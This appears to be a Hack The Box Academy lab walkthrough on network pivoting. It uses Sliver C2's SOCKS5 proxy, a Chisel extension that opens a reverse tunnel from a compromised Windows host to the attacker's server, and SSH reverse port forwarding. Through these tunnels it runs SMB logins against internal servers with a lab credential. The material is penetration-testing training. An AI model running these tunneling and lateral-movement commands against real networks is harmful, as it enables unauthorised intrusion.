#### SOCKS5

SOCKS5 is an Internet protocol that exchanges network packets between a client and server through a proxy server. SOCKS5 performs at Layer 5 of the OSI model and accepts incoming client connections on TCP port 1080 by default. If we want to communicate with Srv01, we could set up a SOCKS5 server by executing a command on Web01 session - `socks5 start -P 1080`.

```sh
sliver (http-beacon) > info

        Session ID: 592f553f-1519-4309-86f0-515ccabe12c8
              Name: http-beacon
          Hostname: web01
              UUID: 02403942-23fd-2def-a4c3-7e8c2dadc4d9
          Username: CHILD\eric
               UID: S-1-5-21-2749819870-3967162335-1946002573-1122
               GID: S-1-5-21-2749819870-3967162335-1946002573-513
               PID: 1708
                OS: windows
           Version: Server 2016 build 17763 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: https://10.10.14.62:9001
    Remote Address: 10.129.229.64:49725
         Proxy URL: 
Reconnect Interval: 1m0s
     First Contact: Thu Oct 26 11:33:49 BST 2023 (28m41s ago)
      Last Checkin: Thu Oct 26 12:02:29 BST 2023 (1s ago)

sliver (http-beacon) > socks5 start -P 1080

[*] Started SOCKS5 127.0.0.1 1080  
⚠️  In-band SOCKS proxies can be a little unstable depending on protocol
```

```sh
3kjS@htb[/htb]$ netstat -ano | grep 1080
tcp        0      0 127.0.0.1:1080          0.0.0.0:*               LISTEN      off (0.00/0/0)
```
#### Chisel

```sh
3kjS@htb[/htb]$ sudo apt install mingw-w64
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
<SNIP>
Need to get 210 MB of archives.
After this operation, 1,110 MB of additional disk space will be used.
Do you want to continue? [Y/n] Y
```

With the `MinGW-w64` development environment package installed on our machine, we can safely clone the forked repository.

```sh
3kjS@htb[/htb]$ git clone https://github.com/MrAle98/chisel
Cloning into 'chisel'...
remote: Enumerating objects: 2238, done.
remote: Counting objects: 100% (73/73), done.
remote: Compressing objects: 100% (60/60), done.
remote: Total 2238 (delta 21), reused 32 (delta 10), pack-reused 2165
Receiving objects: 100% (2238/2238), 3.49 MiB | 19.23 MiB/s, done.
Resolving deltas: 100% (1049/1049), done.
```

```sh
3kjS@htb[/htb]$ cd chisel/
3kjS@htb[/htb]$ mkdir ~/.sliver-client/extensions/chisel
3kjS@htb[/htb]$ cp extension.json ~/.sliver-client/extensions/chisel
3kjS@htb[/htb]$ make windowsdll_64
3kjS@htb[/htb]$ make windowsdll_32
3kjS@htb[/htb]$ cp chisel.x64.dll ~/.sliver-client/extensions/chisel/
3kjS@htb[/htb]$ cp chisel.x86.dll ~/.sliver-client/extensions/chisel/
```

With everything set up, we need to exit the `sliver-client` CLI and restart it for the changes (chisel's extension) to take effect so we can see and use the `chisel` extension.

```sh
sliver (http-beacon) > chisel

[*] Successfully executed chisel
[*] Got output:
No arguments provided
  Usage: chisel [command] [--help]

  Version: v1.8.1 (go1.19.6)

  Commands:
    list  - list running tasks
    stop <taskId> - stop task identified by taskId 
    server - runs a chisel task in server mode
    client - runs a chisel task in client mode

  Read more:
    https://github.com/jpillora/chisel
```

To use the newly installed extension, let's make configurational changes to the `proxychains.conf` file, such as changing the operating port from `9050` to `1080`.

```sh
3kjS@htb[/htb]$ sudo sh -c 'sed -i s/socks4/socks5/g /etc/proxychains.conf && sed -i s/9050/1080/g /etc/proxychains.conf'
```

```sh
3kjS@htb[/htb]$ chisel server --reverse -p 1337 -v --socks5
2023/10/27 09:07:29 server: Reverse tunnelling enabled
2023/10/27 09:07:29 server: Fingerprint 1+LEI/g3cXWqORdvVL2tHW9Y+d7A65F/tsbMrMBrGew=
2023/10/27 09:07:29 server: Listening on http://0.0.0.0:1337
```

We must return to Sliver's console and use our current beacon/session to connect to our chisel server.

```sh
sliver (http-beacon) > chisel client 10.10.14.62:1337 R:socks

[*] Successfully executed chisel
[*] Got output:
received argstring: client 10.10.14.62:1337 R:socks
os.Args = [chisel.exe client 10.10.14.62:1337 R:socks]
Task started successfully.
```

Revisiting the terminal of chisel's server, we can see that the connection to us was successful, and we are now taking advantage of socks proxying.

```sh
3kjS@htb[/htb]$ chisel server --reverse -p 1337 -v --socks5
2023/10/27 09:07:29 server: Reverse tunnelling enabled
2023/10/27 09:07:29 server: Fingerprint 1+LEI/g3cXWqORdvVL2tHW9Y+d7A65F/tsbMrMBrGew=
2023/10/27 09:07:29 server: Listening on http://0.0.0.0:1337
2023/10/27 09:09:17 server: session#1: Handshaking with 10.129.229.69:49782...
2023/10/27 09:09:17 server: session#1: Verifying configuration
2023/10/27 09:09:17 server: session#1: Client version (v1.8.1) differs from server version (1.7.7)
2023/10/27 09:09:17 server: session#1: tun: Created (SOCKS enabled)
2023/10/27 09:09:17 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
2023/10/27 09:09:17 server: session#1: tun: SSH connected
2023/10/27 09:09:17 server: session#1: tun: Bound proxies
```

We can verify if we can access internal machines (and resources) by doing a simple SMB authentication check using `crackmapexec` against SRV01 (172.16.1.12).

```sh
3kjS@htb[/htb]$ proxychains crackmapexec smb 172.16.1.12 -u svc_sql -p 'jkhnrjk123!'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:135  ...  OK
SMB         172.16.1.12     445    SRV01            [*] Windows 10.0 Build 17763 x64 (name:SRV01) (domain:child.htb.local) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:445  ...  OK
SMB         172.16.1.12     445    SRV01            [+] child.htb.local\svc_sql:jkhnrjk123!
```
#### SSH Reverse port forwarding

The case that was shown there was following the logic of us connecting to the target machine with the specified parameters - either `-L` for local port-forwarding, `-R` for remote port-forwarding, or `-D` for dynamic port-forwarding.

```sh
3kjS@htb[/htb]$ sudo sh -c 'echo "Port 2222" >> /etc/ssh/sshd_config'
3kjS@htb[/htb]$ tail -2 /etc/ssh/sshd_config
PasswordAuthentication yes
Port 2222
```

Once, we have added the change in the `sshd_config` file, we are left with restarting the `sshd.service`.

```sh
3kjS@htb[/htb]$ sudo systemctl restart sshd.service
```

```sh
3kjS@htb[/htb]$ ss -ntlp
State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   Process                                
LISTEN   0        128              0.0.0.0:2222          0.0.0.0:*                                             
<SNIP>
```

```sh
PS C:\Users\eric> ssh -R 1080 htb-ac-1008@10.10.14.66 -p 2222
htb-ac-1008@10.10.14.66's password:
<SNIP>

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█

  Welcome and have fun!

Last login: Wed Dec  6 11:45:17 2023 from 10.129.229.127
┌─[eu-academy-1]─[10.10.14.66]─[htb-ac-1008@htb-qfm5hcu7rt]─[~]
└──╼ [★]$
```

```sh
3kjS@htb[/htb]$ proxychains netexec smb 172.16.1.13 -u 'svc_sql' -p 'jkhnrjk123!'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:135  ...  OK
SMB         172.16.1.13     445    SRV02            [*] Windows 10.0 Build 17763 x64 (name:SRV02) (domain:child.htb.local) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:445  ...  OK
SMB         172.16.1.13     445    SRV02            [+] child.htb.local\svc_sql:jkhnrjk123!
```
